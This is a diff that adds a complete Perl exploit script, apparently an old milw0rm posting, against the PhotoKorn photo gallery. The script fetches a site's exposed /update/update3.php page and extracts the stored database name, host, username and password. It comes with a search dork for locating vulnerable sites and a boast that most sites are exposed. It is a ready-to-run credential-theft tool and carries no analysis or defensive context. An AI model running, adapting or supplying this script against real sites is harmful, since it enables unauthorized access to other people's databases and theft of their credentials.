@@ -1,0 +1,57 @@
+#!/usr/bin/perl
+#Script : PhotoKron All Version
+#All Version
+#Author : Pr0metheuS
+#Gr33tz to Gr33tz-Team
+#Gr33tz-Team.ORG
+#Dork : "Powered by photokorn"
+### INFO ##
+# Works IF /update/ is on server...60% site are vulnerable....
+## INFO ##
+use LWP::UserAgent;
+if (@ARGV!=2) {
+	print "-=-=-=-=-=-=-=-=-=-=-=--=\n";
+    print "PhotoKorn Remote Database Info\n";
+    print "by Pr0metheuS\n";
+    print "perl $0 <site> <path>\n";
+	print "-=-=-=-=-=-=-=-=-=-=-=--=\n";
+}
+(my $site,my $path)=@ARGV;
+my $ua = new LWP::UserAgent;
+$ua->agent("Mozilla/8.0");
+$ua = LWP::UserAgent->new;
+my $req = HTTP::Request->new(GET => "".$site."".$path."/update/update3.php");
+$req->header('Accept' => 'text/html');
+my $res = $ua->request($req);
+my $con = $res->content;
+if ($res->is_success) {
+	print "-=-=-=-=-=-=-=-=-=-=-=--=\n";
+    print "PhotoKorn Remote Database Info\n";
+    print "by Pr0metheuS\n\n";
+    
+if($con =~ /<input type="text" value="(.*)" name="dbname">/){
+	$dbname = $1;
+	print "[+] DBNAME : $dbname\n";
+}
+if($con =~ /<input type="text" value="(.*)" name="dbhost">/){
+	$dbhost = $1;
+	print "[+] DBHOST : $dbhost\n";
+}
+if($con =~ /<input type="text" value="(.*)" name="dbusername"><\/td>/){
+	$dbuser = $1;
+	print "[+] DBUSER : $dbuser\n";
+}
+if($con =~ /<input type="password" value="(.*)" name="dbpassword"><\/td>/){
+	$dbpass = $1;
+	print "[+] DBPASSWORD : $dbpass\n";
+}
+print "-=-=-=-=-=-=-=-=-=-=-=--=\n";
+
+
+
+}
+else{
+	print "[+] Exploit Failed...\n";
+}
+
+# milw0rm.com [2008-01-11]
